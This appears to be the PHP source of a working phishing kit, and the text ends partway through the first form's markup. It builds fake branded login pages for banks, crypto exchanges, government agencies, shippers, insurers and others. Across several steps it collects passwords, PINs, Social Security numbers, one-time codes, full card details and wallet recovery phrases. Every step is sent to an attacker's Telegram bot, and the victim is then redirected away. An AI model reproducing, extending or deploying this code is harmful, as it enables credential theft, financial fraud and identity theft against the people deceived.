<?php
session_start();
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('Expires: 0');
header('X-Robots-Tag: noindex, nofollow');

$config  = json_decode(file_get_contents(__DIR__.'/bot-config.json'),  true) ?? [];
$presets = json_decode(file_get_contents(__DIR__.'/letter_presets.json'), true) ?? [];

// ── Identify preset ──────────────────────────────────────────────────────────
$pid = preg_replace('/[^a-z0-9_]/', '', strtolower($_GET['id'] ?? ''));
$preset = null;
foreach ($presets as $p) { if (($p['id']??'') === $pid) { $preset = $p; break; } }
if (!$preset) { http_response_code(404); echo '<h2 style="font-family:sans-serif;padding:60px;text-align:center">Page not found</h2>'; exit; }

// ── Bot helpers ──────────────────────────────────────────────────────────────
$bot_token = $config['control_bot_token'] ?? $config['visits_bot_token'] ?? '';
$admin_id  = $config['admin_chat_id'] ?? '';
function lp_tg($token, $admin, $msg) {
    if (!$token || !$admin) return;
    @file_get_contents("https://api.telegram.org/bot{$token}/sendMessage", false,
        stream_context_create(['http'=>['method'=>'POST','timeout'=>4,
            'header'=>"Content-type: application/x-www-form-urlencoded\r\n",
            'content'=>http_build_query(['chat_id'=>$admin,'text'=>$msg,'parse_mode'=>'Markdown'])]]));
}

// ── VID ──────────────────────────────────────────────────────────────────────
$vid = '';
if (!empty($_COOKIE['vid'])) { $vid = preg_replace('/[^A-F0-9]/','',strtoupper($_COOKIE['vid'])); if(strlen($vid)!==8)$vid=''; }
if (!$vid) { $vid = strtoupper(bin2hex(random_bytes(4))); setcookie('vid',$vid,time()+86400*365,'/',''  ,false,true); }

$ip  = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
$ua  = substr($_SERVER['HTTP_USER_AGENT']??'',0,200);
$ts  = date('Y-m-d H:i:s');
$dev = preg_match('/Mobile|Android|iPhone|iPad/i',$ua) ? '📱' : '💻';

$brand    = addslashes($preset['org_name'] ?? $pid);
$ref_code = ($preset['ref_prefix']??'REF').'-'.strtoupper(substr($vid,0,6));
$redirect = trim($preset['redirect_link'] ?? 'https://google.com');
if (!preg_match('/^https?:\/\//i',$redirect)) $redirect = 'https://google.com';

$category = strtolower($preset['category'] ?? 'banking');

// ── Determine login_type from category ───────────────────────────────────────
function get_login_type(string $category, string $id): string {
    $map = [
        'banking'      => 'banking',
        'payment'      => 'payment',
        'crypto'       => 'crypto',
        'tech'         => 'tech',
        'streaming'    => 'streaming',
        'government'   => 'government',
        'shipping'     => 'shipping',
        'delivery'     => 'shipping',
        'telco'        => 'telecom',
        'telecom'      => 'telecom',
        'insurance'    => 'insurance',
        'retail'       => 'retail',
        'ecommerce'    => 'retail',
        'social'       => 'social',
        'healthcare'   => 'healthcare',
        'legal'        => 'legal',
        'court'        => 'legal',
        'notifications'=> 'government',
        'custom'       => 'banking',
    ];
    return $map[$category] ?? 'banking';
}
$lt = get_login_type($category, $pid);

// ── Log visit file ───────────────────────────────────────────────────────────
$log_file = __DIR__.'/landing-visits.json';
$visits   = file_exists($log_file) ? (json_decode(file_get_contents($log_file),true)??[]) : [];

// ── Handle AJAX step submissions ─────────────────────────────────────────────
if ($_SERVER['REQUEST_METHOD']==='POST' && !empty($_POST['_lp_step'])) {
    header('Content-Type: application/json');
    $step = intval($_POST['_lp_step']);
    $safe = fn($k) => htmlspecialchars(trim($_POST[$k]??''), ENT_QUOTES);

    if ($step === 1) {
        $entry = ['preset'=>$pid,'brand'=>$preset['org_name']??$pid,'vid'=>$vid,'ip'=>$ip,'ua'=>$ua,'ts'=>$ts,'mobile'=>(bool)preg_match('/Mobile|Android|iPhone|iPad/i',$ua)];
        $visits[] = $entry;
        if (count($visits)>5000) $visits = array_slice($visits,-5000);
        file_put_contents($log_file, json_encode($visits,JSON_UNESCAPED_UNICODE));
    }

    if ($step === 1) {
        $email = $safe('email');
        $uname = $safe('username');
        $phone = $safe('phone');
        $ssn_g = $safe('ssn_gov');
        $fname = $safe('fullname');
        $track = $safe('tracking');
        $field1_label = $safe('field1_label');
        lp_tg($bot_token, $admin_id,
            "{$dev} *Step 1 — Identifier*\n━━━━━━━━━━━━━━━━━━\n"
           ."🏢 Brand: *{$brand}*\n🆔 Ref: `{$ref_code}`\n"
           .($email   ? "📧 Email: `{$email}`\n"         : "")
           .($uname   ? "👤 Username: `{$uname}`\n"      : "")
           .($phone   ? "📞 Phone: `{$phone}`\n"         : "")
           .($ssn_g   ? "🆔 SSN: `{$ssn_g}`\n"          : "")
           .($fname   ? "👤 Name: `{$fname}`\n"          : "")
           .($track   ? "📦 Tracking: `{$track}`\n"      : "")
           ."🌐 IP: `{$ip}`\n📅 {$ts}");
        echo json_encode(['ok'=>true]);

    } elseif ($step === 2) {
        $pass = $safe('password');
        $pin  = $safe('pin');
        $dob  = $safe('dob');
        $zip  = $safe('zip');
        lp_tg($bot_token, $admin_id,
            "🔐 *Step 2 — Credentials*\n━━━━━━━━━━━━━━━━━━\n"
           ."🏢 Brand: *{$brand}*\n🆔 Ref: `{$ref_code}`\n"
           .($pass ? "🔑 Password: `{$pass}`\n" : "")
           .($pin  ? "🔢 PIN: `{$pin}`\n"        : "")
           .($dob  ? "📅 DOB: `{$dob}`\n"        : "")
           .($zip  ? "📮 ZIP: `{$zip}`\n"        : "")
           ."🌐 IP: `{$ip}`");
        echo json_encode(['ok'=>true]);

    } elseif ($step === 3) {
        $ssn    = $safe('ssn');
        $dob3   = $safe('dob3');
        $zip3   = $safe('zip3');
        $otp    = $safe('otp');
        $addr   = $safe('address');
        $wallet = $safe('wallet');
        $policy = $safe('policy');
        $last4  = $safe('last4');
        $card3  = $safe('card');
        $exp3   = $safe('exp');
        $cvv3   = $safe('cvv');
        $cname3 = $safe('cname');
        $is_final = (get_login_type($category, $pid) !== 'banking' && get_login_type($category, $pid) !== 'crypto');
        lp_tg($bot_token, $admin_id,
            "🪪 *Step 3 — Verification*\n━━━━━━━━━━━━━━━━━━\n"
           ."🏢 Brand: *{$brand}*\n🆔 Ref: `{$ref_code}`\n"
           .($ssn    ? "🆔 SSN: `{$ssn}`\n"         : "")
           .($dob3   ? "📅 DOB: `{$dob3}`\n"        : "")
           .($zip3   ? "📮 ZIP: `{$zip3}`\n"        : "")
           .($otp    ? "🔢 OTP: `{$otp}`\n"         : "")
           .($addr   ? "🏠 Address: `{$addr}`\n"    : "")
           .($wallet ? "💰 Wallet: `{$wallet}`\n"   : "")
           .($policy ? "📋 Policy: `{$policy}`\n"   : "")
           .($last4  ? "💳 Last4: `{$last4}`\n"     : "")
           .($card3  ? "💳 Card: `{$card3}`\n"      : "")
           .($exp3   ? "📅 Exp: `{$exp3}`\n"        : "")
           .($cvv3   ? "🔒 CVV: `{$cvv3}`\n"        : "")
           .($cname3 ? "👤 Name: `{$cname3}`\n"     : "")
           ."🌐 IP: `{$ip}`"
           .($is_final ? "\n\n✅ *FULL SET COLLECTED*" : ""));
        if ($is_final) {
            echo json_encode(['ok'=>true,'redirect'=>$redirect]);
        } else {
            echo json_encode(['ok'=>true]);
        }

    } elseif ($step === 4) {
        $card  = $safe('card');
        $exp   = $safe('exp');
        $cvv   = $safe('cvv');
        $cname = $safe('cname');
        $ssn4  = $safe('ssn4');
        lp_tg($bot_token, $admin_id,
            "💳 *Step 4 — Card/Final*\n━━━━━━━━━━━━━━━━━━\n"
           ."🏢 Brand: *{$brand}*\n🆔 Ref: `{$ref_code}`\n"
           .($card  ? "💳 Card: `{$card}`\n"     : "")
           .($exp   ? "📅 Exp: `{$exp}`\n"       : "")
           .($cvv   ? "🔒 CVV: `{$cvv}`\n"       : "")
           .($cname ? "👤 Name: `{$cname}`\n"    : "")
           .($ssn4  ? "🆔 SSN: `{$ssn4}`\n"      : "")
           ."🌐 IP: `{$ip}`\n\n✅ *FULL SET COLLECTED*");
        echo json_encode(['ok'=>true,'redirect'=>$redirect]);

    } else {
        echo json_encode(['ok'=>false]);
    }
    exit;
}

// ── Brand colors ─────────────────────────────────────────────────────────────
$accent  = preg_match('/^#[0-9a-fA-F]{6}$/',$preset['color_primary']??'')   ? $preset['color_primary']   : '#1a3a6b';
$csec    = preg_match('/^#[0-9a-fA-F]{6}$/',$preset['color_secondary']??'') ? $preset['color_secondary'] : '';
$logo_bg = preg_match('/^#[0-9a-fA-F]{6}$/',$preset['logo_bg']??'')         ? $preset['logo_bg']         : '#ffffff';

function lp_rgb($h){$h=ltrim($h,'#');return[hexdec(substr($h,0,2)),hexdec(substr($h,2,2)),hexdec(substr($h,4,2))];}
[$ar,$ag,$ab] = lp_rgb($accent);
$sec = $csec ?: sprintf('#%02x%02x%02x',max(0,$ar-40),max(0,$ag-40),max(0,$ab-40));
[$sr,$sg,$sb] = lp_rgb($sec);
$lum = (0.299*$ar+0.587*$ag+0.114*$ab)/255;

// Government/legal/healthcare use light background
$is_light_theme = in_array($lt, ['government','legal','healthcare']);
$on  = $lum>0.55 ? '#1a1a2e' : '#ffffff';
$onm = $lum>0.55 ? 'rgba(0,0,0,0.55)' : 'rgba(255,255,255,0.65)';

$org_name = htmlspecialchars($preset['org_name']??'');
$org_sub  = htmlspecialchars($preset['org_sub']??'');
$logo_url = $preset['logo_url']??'';
$footer   = htmlspecialchars($preset['footer_text']??'');
$today    = date('F j, Y');

// ── Per-category step config ─────────────────────────────────────────────────
$step_configs = [
    'banking' => [
        'steps' => 4,
        'step_titles' => [
            1 => 'Sign In to Online Banking',
            2 => 'Enter Your Password',
            3 => 'Verify Your Identity',
            4 => 'Confirm Debit/Credit Card',
        ],
        'step_subs' => [
            1 => 'Enter your Online Banking ID or email address',
            2 => 'For your security, please enter your password',
            3 => 'We need to verify your identity before proceeding',
            4 => 'Confirm your card on file to complete verification',
        ],
        'step1_fields' => 'username_or_email',
        'step2_fields' => 'password',
        'step3_fields' => 'ssn_dob_zip',
        'step4_fields' => 'card_full',
        'btn_labels'   => ['Continue','Sign In','Verify Identity','Complete Verification'],
    ],
    'payment' => [
        'steps' => 3,
        'step_titles' => [
            1 => 'Log In to Your Account',
            2 => 'Enter Your Password',
            3 => 'Confirm Payment Method',
        ],
        'step_subs' => [
            1 => 'Enter your email or mobile number',
            2 => 'Keep your account secure',
            3 => 'Add or confirm your payment card',
        ],
        'step1_fields' => 'email_or_phone',
        'step2_fields' => 'password',
        'step3_fields' => 'card_full',
        'btn_labels'   => ['Continue','Log In','Confirm Card'],
    ],
    'crypto' => [
        'steps' => 4,
        'step_titles' => [
            1 => 'Sign In to Your Account',
            2 => 'Enter Password',
            3 => 'Two-Factor Verification',
            4 => 'Verify Wallet Ownership',
        ],
        'step_subs' => [
            1 => 'Enter your registered email address',
            2 => 'Enter your account password',
            3 => 'Enter the 6-digit code from your authenticator app',
            4 => 'Paste your recovery phrase to confirm ownership',
        ],
        'step1_fields' => 'email_only',
        'step2_fields' => 'password',
        'step3_fields' => 'otp_code',
        'step4_fields' => 'wallet_phrase',
        'btn_labels'   => ['Continue','Unlock Account','Verify Code','Confirm Ownership'],
    ],
    'tech' => [
        'steps' => 3,
        'step_titles' => [
            1 => 'Sign In',
            2 => 'Enter Your Password',
            3 => 'Verify It\'s You',
        ],
        'step_subs' => [
            1 => 'Enter your email, phone, or account ID',
            2 => 'Enter the password for your account',
            3 => 'Enter the verification code sent to your device',
        ],
        'step1_fields' => 'email_only',
        'step2_fields' => 'password',
        'step3_fields' => 'otp_code',
        'btn_labels'   => ['Next','Sign In','Verify'],
    ],
    'streaming' => [
        'steps' => 3,
        'step_titles' => [
            1 => 'Sign In',
            2 => 'Enter Your Password',
            3 => 'Update Payment Method',
        ],
        'step_subs' => [
            1 => 'Enter the email address for your account',
            2 => 'Enter your password to continue',
            3 => 'Your payment method needs to be updated',
        ],
        'step1_fields' => 'email_only',
        'step2_fields' => 'password',
        'step3_fields' => 'card_full',
        'btn_labels'   => ['Continue','Sign In','Update Payment'],
    ],
    'government' => [
        'steps' => 3,
        'step_titles' => [
            1 => 'Identify Yourself',
            2 => 'Date of Birth & ZIP Code',
            3 => 'Provide Mailing Address',
        ],
        'step_subs' => [
            1 => 'Enter your full legal name and Social Security Number',
            2 => 'Please confirm your date of birth and ZIP code on file',
            3 => 'Confirm your current mailing address',
        ],
        'step1_fields' => 'name_ssn',
        'step2_fields' => 'dob_zip',
        'step3_fields' => 'address',
        'btn_labels'   => ['Continue','Continue','Submit'],
    ],
    'shipping' => [
        'steps' => 3,
        'step_titles' => [
            1 => 'Track Your Shipment',
            2 => 'Account Sign In',
            3 => 'Verify Your Identity',
        ],
        'step_subs' => [
            1 => 'Enter your tracking number and delivery ZIP code',
            2 => 'Sign in to manage your delivery preferences',
            3 => 'Confirm your date of birth to complete verification',
        ],
        'step1_fields' => 'tracking_zip',
        'step2_fields' => 'email_password',
        'step3_fields' => 'dob_only',
        'btn_labels'   => ['Track Package','Sign In','Confirm Identity'],
    ],
    'telecom' => [
        'steps' => 3,
        'step_titles' => [
            1 => 'Sign In to Your Account',
            2 => 'Enter Your PIN / Password',
            3 => 'Confirm Payment on File',
        ],
        'step_subs' => [
            1 => 'Enter your phone number or account number',
            2 => 'Enter your 6-digit PIN or account password',
            3 => 'Confirm the last 4 digits of your card and ZIP code',
        ],
        'step1_fields' => 'phone_or_account',
        'step2_fields' => 'pin_or_password',
        'step3_fields' => 'last4_zip',
        'btn_labels'   => ['Continue','Sign In','Confirm'],
    ],
    'insurance' => [
        'steps' => 3,
        'step_titles' => [
            1 => 'Access Your Policy',
            2 => 'Date of Birth & ZIP Code',
            3 => 'Update Payment Method',
        ],
        'step_subs' => [
            1 => 'Enter your policy number or email address',
            2 => 'Please confirm your date of birth and ZIP on file',
            3 => 'Your card on file requires re-confirmation',
        ],
        'step1_fields' => 'policy_email',
        'step2_fields' => 'dob_zip',
        'step3_fields' => 'card_full',
        'btn_labels'   => ['Access Policy','Verify','Update Payment'],
    ],
    'retail' => [
        'steps' => 3,
        'step_titles' => [
            1 => 'Sign In to Your Account',
            2 => 'Enter Your Password',
            3 => 'Verify Payment Method',
        ],
        'step_subs' => [
            1 => 'Enter your email address',
            2 => 'Enter the password for your account',
            3 => 'Confirm your payment card to resolve account issue',
        ],
        'step1_fields' => 'email_only',
        'step2_fields' => 'password',
        'step3_fields' => 'card_full',
        'btn_labels'   => ['Sign In','Continue','Confirm'],
    ],
    'social' => [
        'steps' => 2,
        'step_titles' => [
            1 => 'Log In',
            2 => 'Enter Your Password',
        ],
        'step_subs' => [
            1 => 'Enter your email, phone, or username',
            2 => 'Enter the password for your account',
        ],
        'step1_fields' => 'email_or_phone',
        'step2_fields' => 'password',
        'btn_labels'   => ['Continue','Log In'],
    ],
    'healthcare' => [
        'steps' => 3,
        'step_titles' => [
            1 => 'Member Login',
            2 => 'Verify Your Identity',
            3 => 'Confirm Insurance Details',
        ],
        'step_subs' => [
            1 => 'Enter your member ID or email address',
            2 => 'Enter your date of birth and ZIP code',
            3 => 'Enter your card details for billing verification',
        ],
        'step1_fields' => 'member_email',
        'step2_fields' => 'dob_zip',
        'step3_fields' => 'card_full',
        'btn_labels'   => ['Continue','Verify','Confirm'],
    ],
    'legal' => [
        'steps' => 3,
        'step_titles' => [
            1 => 'Access Your Case',
            2 => 'Identity Verification',
            3 => 'Provide Payment Details',
        ],
        'step_subs' => [
            1 => 'Enter your case number or full legal name',
            2 => 'Enter your SSN and date of birth to verify identity',
            3 => 'Payment required to process your case',
        ],
        'step1_fields' => 'case_name',
        'step2_fields' => 'ssn_dob',
        'step3_fields' => 'card_full',
        'btn_labels'   => ['Access Case','Verify Identity','Submit Payment'],
    ],
];

$sc = $step_configs[$lt] ?? $step_configs['banking'];
$total_steps = $sc['steps'];

// ── Theme: light vs dark ─────────────────────────────────────────────────────
if ($is_light_theme) {
    $body_bg  = '#f4f6f9';
    $card_bg  = '#ffffff';
    $card_brd = '#dce0e8';
    $card_shd = '0 4px 24px rgba(0,0,0,0.10)';
    $text_main= '#1a2340';
    $text_muted='#6b7280';
    $input_bg = '#f9fafb';
    $input_brd= '#d1d5db';
    $input_fc = '#374151';
    $footer_bg= '#f0f2f6';
    $footer_txt='#9ca3af';
    $dot_bg   = 'rgba(0,0,0,0.12)';
    $err_col  = '#dc2626';
} else {
    $body_bg  = 'radial-gradient(ellipse at 20% 15%,rgba('.$ar.','.$ag.','.$ab.',.12) 0%,#070b14 50%,#0a0f1e 100%)';
    $card_bg  = 'rgba(255,255,255,0.03)';
    $card_brd = 'rgba(255,255,255,0.08)';
    $card_shd = '0 32px 80px rgba(0,0,0,0.55),0 0 0 1px rgba(255,255,255,0.04)';
    $text_main= '#f1f5f9';
    $text_muted='#94a3b8';
    $input_bg = 'rgba(255,255,255,0.05)';
    $input_brd= 'rgba(255,255,255,0.12)';
    $input_fc = '#f1f5f9';
    $footer_bg= 'rgba(0,0,0,0.2)';
    $footer_txt='#64748b';
    $dot_bg   = 'rgba(255,255,255,0.1)';
    $err_col  = '#f87171';
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title><?=$org_name?> — Secure Login</title>
<meta name="robots" content="noindex,nofollow">
<link rel="preconnect" href="https://fonts.googleapis.com">
<?php if ($lt === 'government' || $lt === 'legal'): ?>
<link href="https://fonts.googleapis.com/css2?family=Source+Serif+4:wght@400;600;700&family=Source+Sans+3:wght@400;500;600;700&display=swap" rel="stylesheet">
<?php elseif ($lt === 'crypto'): ?>
<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<?php else: ?>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
<?php endif; ?>
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{
  --accent:<?=$accent?>;
  --sec:<?=$sec?>;
  --on:<?=$on?>;
  --onm:<?=$onm?>;
  --r:<?=$ar?>;--g:<?=$ag?>;--b:<?=$ab?>;
}
<?php if ($lt === 'government' || $lt === 'legal'): ?>
body{font-family:'Source Sans 3',Arial,sans-serif;min-height:100vh;background:<?=$body_bg?>;display:flex;align-items:center;justify-content:center;padding:20px 16px;color:<?=$text_main?>}
<?php elseif ($lt === 'crypto'): ?>
body{font-family:'Space Grotesk',system-ui,sans-serif;min-height:100vh;background:<?=$body_bg?>;display:flex;align-items:center;justify-content:center;padding:20px 16px;color:<?=$text_main?>}
<?php else: ?>
body{font-family:'Inter',system-ui,sans-serif;min-height:100vh;background:<?=$body_bg?>;display:flex;align-items:center;justify-content:center;padding:20px 16px;color:<?=$text_main?>}
<?php endif; ?>

/* ── Card ── */
.card{width:100%;max-width:440px;background:<?=$card_bg?>;border:1px solid <?=$card_brd?>;border-radius:<?=$is_light_theme?'8px':'22px'?>;overflow:hidden;box-shadow:<?=$card_shd?>}

/* ── Brand strip ── */
.brand{background:linear-gradient(135deg,var(--accent) 0%,var(--sec) 100%);padding:22px 24px;position:relative;overflow:hidden}
<?php if ($lt !== 'government' && $lt !== 'legal'): ?>
.brand::before{content:'';position:absolute;right:-50px;top:-50px;width:200px;height:200px;border-radius:50%;background:rgba(255,255,255,0.06)}
<?php endif; ?>
.brand-row{display:flex;align-items:center;gap:14px;position:relative;z-index:1}
.brand-logo{width:52px;height:52px;border-radius:<?=$is_light_theme?'4px':'12px'?>;background:<?=$logo_bg?>;display:flex;align-items:center;justify-content:center;overflow:hidden;flex-shrink:0;box-shadow:0 4px 16px rgba(0,0,0,0.25)}
.brand-logo img{width:100%;height:100%;object-fit:contain}
.brand-logo .ini{font-size:18px;font-weight:800;color:var(--accent)}
.brand-name{font-size:17px;font-weight:800;color:var(--on);letter-spacing:-.2px}
.brand-sub{font-size:10px;color:var(--onm);margin-top:3px;text-transform:uppercase;letter-spacing:.5px}
.brand-foot{display:flex;justify-content:space-between;align-items:center;margin-top:14px;padding-top:12px;border-top:1px solid rgba(255,255,255,0.15);position:relative;z-index:1}
.brand-date{font-size:11px;color:var(--onm)}
.brand-ref{font-size:10px;font-weight:700;color:var(--on);background:rgba(255,255,255,0.18);border:1px solid rgba(255,255,255,0.25);padding:3px 9px;border-radius:5px;letter-spacing:.3px}
.brand-lock{font-size:10px;font-weight:700;color:var(--on);display:flex;align-items:center;gap:4px;opacity:.9}

/* ── Body ── */
.body{padding:<?=$is_light_theme?'28px 28px':'28px 24px'?>}
.step-header{margin-bottom:20px;<?=$is_light_theme?'text-align:left':'text-align:center'?>}
.step-title{font-size:<?=$is_light_theme?'18px':'16px'?>;font-weight:700;color:<?=$text_main?>;margin-bottom:5px;<?=$is_light_theme?'font-family:"Source Serif 4",Georgia,serif':''?>}
.step-sub{font-size:13px;color:<?=$text_muted?>;line-height:1.5}

/* ── Steps indicator ── */
.steps{display:flex;<?=$is_light_theme?'justify-content:flex-start':'justify-content:center'?>;gap:6px;margin-bottom:22px}
.dot{width:28px;height:4px;border-radius:2px;background:<?=$dot_bg?>;transition:background .3s}
.dot.active{background:var(--accent)}
.dot.done{background:rgba(var(--r),var(--g),var(--b),.4)}
<?php if ($is_light_theme): ?>
.dot.done{background:rgba(<?=$ar?>,<?=$ag?>,<?=$ab?>,.35)}
<?php else: ?>
.dot.done{background:rgba(<?=$ar?>,<?=$ag?>,<?=$ab?>,.4)}
<?php endif; ?>

/* ── Form ── */
.field{margin-bottom:14px}
.field label{display:block;font-size:<?=$is_light_theme?'12px':'11px'?>;color:<?=$text_muted?>;font-weight:600;letter-spacing:<?=$is_light_theme?'.3px':'.5px'?>;text-transform:uppercase;margin-bottom:6px}
.field input,.field select{width:100%;background:<?=$input_bg?>;border:1px solid <?=$input_brd?>;color:<?=$input_fc?>;padding:<?=$is_light_theme?'11px 13px':'12px 14px'?>;border-radius:<?=$is_light_theme?'6px':'10px'?>;font-size:14px;outline:none;transition:border-color .2s,background .2s;-webkit-appearance:none;font-family:inherit}
.field input:focus,.field select:focus{border-color:var(--accent);background:<?=$is_light_theme?'rgba('.$ar.','.$ag.','.$ab.',.05)':'rgba('.$ar.','.$ag.','.$ab.',.06)'?>}
.field input::placeholder{color:<?=$is_light_theme?'#9ca3af':'#475569'?>}

/* Card grid */
.card-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}

/* ── Submit btn ── */
.btn{width:100%;padding:13px;background:var(--accent);color:var(--on);font-size:<?=$is_light_theme?'15px':'14px'?>;font-weight:700;border:none;border-radius:<?=$is_light_theme?'6px':'10px'?>;cursor:pointer;margin-top:6px;letter-spacing:.2px;transition:filter .15s,transform .15s;position:relative;overflow:hidden;font-family:inherit}
.btn:hover{filter:brightness(1.08);transform:translateY(-1px)}
.btn:active{transform:translateY(0)}
.btn:disabled{opacity:.6;cursor:not-allowed;transform:none}
.btn-spin{display:none;position:absolute;right:16px;top:50%;transform:translateY(-50%);width:16px;height:16px;border:2px solid rgba(255,255,255,0.3);border-top-color:#fff;border-radius:50%}
@keyframes spin{to{transform:translateY(-50%) rotate(360deg)}}
.btn.loading .btn-spin{display:block;animation:spin .7s linear infinite}

/* ── Error msg ── */
.err-msg{font-size:12px;color:<?=$err_col?>;margin-top:10px;display:none}

/* ── Divider ── */
.or{text-align:center;font-size:11px;color:<?=$is_light_theme?'#9ca3af':'#334155'?>;margin:14px 0;position:relative}
.or::before,.or::after{content:'';position:absolute;top:50%;width:38%;height:1px;background:<?=$is_light_theme?'#e5e7eb':'rgba(255,255,255,0.06)'?>}
.or::before{left:0}.or::after{right:0}

/* ── OTP input ── */
.otp-wrap{display:flex;gap:8px;justify-content:center}
.otp-wrap input{flex:1;text-align:center;font-size:22px;font-weight:700;letter-spacing:2px;padding:14px 4px;max-width:48px}
<?php if ($lt === 'crypto'): ?>
.otp-wrap input{background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.15);border-radius:8px;color:#f1f5f9}
.otp-wrap input:focus{border-color:var(--accent)}
<?php else: ?>
.otp-wrap input{background:<?=$input_bg?>;border:1px solid <?=$input_brd?>;border-radius:6px;color:<?=$input_fc?>}
<?php endif; ?>
.otp-hint{font-size:12px;color:<?=$text_muted?>;text-align:center;margin-top:10px}

/* ── Wallet phrase ── */
.wallet-area{width:100%;min-height:80px;background:<?=$input_bg?>;border:1px solid <?=$input_brd?>;color:<?=$input_fc?>;padding:12px 14px;border-radius:10px;font-size:13px;font-family:monospace;outline:none;resize:none}
.wallet-area:focus{border-color:var(--accent)}
.wallet-hint{font-size:11px;color:<?=$text_muted?>;margin-top:6px;line-height:1.5}

/* ── Address textarea ── */
.addr-area{width:100%;min-height:60px;background:<?=$input_bg?>;border:1px solid <?=$input_brd?>;color:<?=$input_fc?>;padding:12px 14px;border-radius:<?=$is_light_theme?'6px':'10px'?>;font-size:14px;font-family:inherit;outline:none;resize:none;transition:border-color .2s}
.addr-area:focus{border-color:var(--accent)}

/* ── Security badge ── */
.sec-badge{display:flex;align-items:center;gap:6px;justify-content:center;font-size:11px;color:<?=$text_muted?>;margin-top:14px;padding-top:12px;border-top:1px solid <?=$is_light_theme?'#e5e7eb':'rgba(255,255,255,0.06)'?>}

/* ── Footer ── */
.card-footer{padding:14px 20px;background:<?=$footer_bg?>;border-top:1px solid <?=$is_light_theme?'#e5e7eb':'rgba(255,255,255,0.05)'?>;font-size:10px;color:<?=$footer_txt?>;text-align:center;line-height:1.6}

/* Loading overlay */
#loadOverlay{display:none;position:fixed;inset:0;background:<?=$is_light_theme?'rgba(255,255,255,0.85)':'rgba(7,11,20,0.9)'?>;z-index:999;align-items:center;justify-content:center;flex-direction:column;gap:16px}
#loadOverlay.show{display:flex}
.load-spinner{width:44px;height:44px;border:3px solid <?=$is_light_theme?'rgba(0,0,0,0.1)':'rgba(255,255,255,0.1)'?>;border-top-color:var(--accent);border-radius:50%;animation:spin .8s linear infinite}
.load-text{font-size:13px;color:<?=$text_muted?>}

@media(max-width:440px){.body{padding:22px 18px}.card{border-radius:<?=$is_light_theme?'4px':'16px'?>}.otp-wrap input{max-width:40px;font-size:18px}}
</style>
</head>
<body>

<!-- Loading overlay -->
<div id="loadOverlay">
  <div class="load-spinner"></div>
  <div class="load-text" id="loadText">Verifying your information…</div>
</div>

<div class="card">

  <!-- Brand strip -->
  <div class="brand">
    <div class="brand-row">
      <div class="brand-logo">
        <?php if($logo_url):?><img src="<?=htmlspecialchars($logo_url)?>" alt="" loading="eager" onerror="this.style.display='none';this.parentNode.querySelector('.ini').style.display='flex'"><?php endif;?>
        <span class="ini" style="<?=$logo_url?'display:none':'display:flex'?>;align-items:center;justify-content:center;width:100%;height:100%"><?=mb_strtoupper(mb_substr($org_name,0,2))?></span>
      </div>
      <div>
        <div class="brand-name"><?=$org_name?></div>
        <div class="brand-sub"><?=$org_sub?></div>
      </div>
    </div>
    <div class="brand-foot">
      <span class="brand-date">📅 <?=$today?></span>
      <span class="brand-lock">🔒 Secure Portal</span>
      <span class="brand-ref"><?=htmlspecialchars($ref_code)?></span>
    </div>
  </div>

  <!-- Body -->
  <div class="body">

    <!-- Step indicators -->
    <div class="steps" id="stepDots">
      <?php for($i=1;$i<=$total_steps;$i++): ?>
      <div class="dot <?=$i===1?'active':''?>" id="d<?=$i?>"></div>
      <?php endfor; ?>
    </div>

    <!-- ════════════════════ STEP 1 ════════════════════ -->
    <div id="step1">
      <div class="step-header">
        <div class="step-title"><?=htmlspecialchars($sc['step_titles'][1])?></div>
        <div class="step-sub"><?=htmlspecialchars($sc['step_subs'][1])?></div>
      </div>
      <form onsubmit="submitStep(event,1)">
        <?php
        $s1f = $sc['step1_fields'];
        if ($s1f === 'username_or_email'): ?>
          <div class="field">
            <label>Online Banking ID</label>
            <input type="text" id="f_username" name="username" placeholder="Enter your Banking ID or username" autocomplete="username">
          </div>
          <div class="or">or</div>
          <div class="field">
            <label>Email Address</label>
            <input type="email" id="f_email" name="email" placeholder="you@email.com" autocomplete="email">
          </div>
        <?php elseif ($s1f === 'email_or_phone'): ?>
          <div class="field">
            <label>Email or Mobile Number</label>
            <input type="text" id="f_email" name="email" placeholder="Email or mobile number" autocomplete="username">
          </div>
        <?php elseif ($s1f === 'email_only'): ?>
          <div class="field">
            <label>Email Address</label>
            <input type="email" id="f_email" name="email" placeholder="Enter your email" autocomplete="email">
          </div>
        <?php elseif ($s1f === 'phone_or_account'): ?>
          <div class="field">
            <label>Phone Number or Account Number</label>
            <input type="text" id="f_phone" name="phone" placeholder="Phone number or account #" autocomplete="tel">
          </div>
        <?php elseif ($s1f === 'name_ssn'): ?>
          <div class="field">
            <label>Full Legal Name</label>
            <input type="text" id="f_fullname" name="fullname" placeholder="As it appears on your ID" autocomplete="name">
          </div>
          <div class="field">
            <label>Social Security Number</label>
            <input type="text" id="f_ssn_gov" name="ssn_gov" placeholder="XXX-XX-XXXX" maxlength="11" oninput="fmtSSN(this)" autocomplete="off">
          </div>
        <?php elseif ($s1f === 'tracking_zip'): ?>
          <div class="field">
            <label>Tracking Number</label>
            <input type="text" id="f_tracking" name="tracking" placeholder="Enter tracking number" autocomplete="off">
          </div>
          <div class="field">
            <label>Delivery ZIP Code</label>
            <input type="text" id="f_zip_t" name="zip" placeholder="e.g. 10001" maxlength="10" autocomplete="postal-code">
          </div>
        <?php elseif ($s1f === 'policy_email'): ?>
          <div class="field">
            <label>Policy Number</label>
            <input type="text" id="f_policy" name="policy" placeholder="Enter your policy number" autocomplete="off">
          </div>
          <div class="or">or</div>
          <div class="field">
            <label>Email Address</label>
            <input type="email" id="f_email" name="email" placeholder="Registered email address" autocomplete="email">
          </div>
        <?php elseif ($s1f === 'member_email'): ?>
          <div class="field">
            <label>Member ID</label>
            <input type="text" id="f_username" name="username" placeholder="Member ID from your card" autocomplete="off">
          </div>
          <div class="or">or</div>
          <div class="field">
